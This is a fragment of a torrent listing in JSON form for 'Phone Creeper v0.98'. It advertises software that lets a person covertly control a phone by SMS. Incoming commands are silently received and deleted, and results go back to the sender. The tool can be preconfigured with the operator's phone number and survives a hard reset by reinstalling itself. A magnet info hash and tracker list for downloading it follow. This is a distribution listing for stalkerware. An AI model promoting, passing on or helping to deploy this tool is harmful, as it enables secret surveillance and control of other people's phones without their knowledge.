Phones running this software can be remotely controled by sms text messages. All commands will be silently received and deleted immediately and results will be issued back to sender.\npre-configured settings can be added to the installer to have your own default password and phone number to receive live updates. By default, this program will silently reinstall itself even after a hard reset, if the memory card with these files is still in the device.","torrent":{"xt":"urn:btih:45c3f5ebe4bd9f9b00680639e606bdbd934976ca","amp;dn":"Phone+Creeper+v0.98","amp;tr":["udp%3A%2F%2Ftracker.openbittorrent.com%3A80","udp%3A%2F%2Fopen.demonii.com%3A1337","udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969","udp%3A%2F%2Fexodus.desync.com%3A6969"],"infoHash":"45c3f5ebe4bd9f9b00680639e606bdbd934976ca","infoHashBuffer":{"type":"Buffer","data":[69,195,245,235,228,189,159,155,0,104,6,57,230,6,189,189,147,73,118,202]},"announce":[],"urlList":[]}}
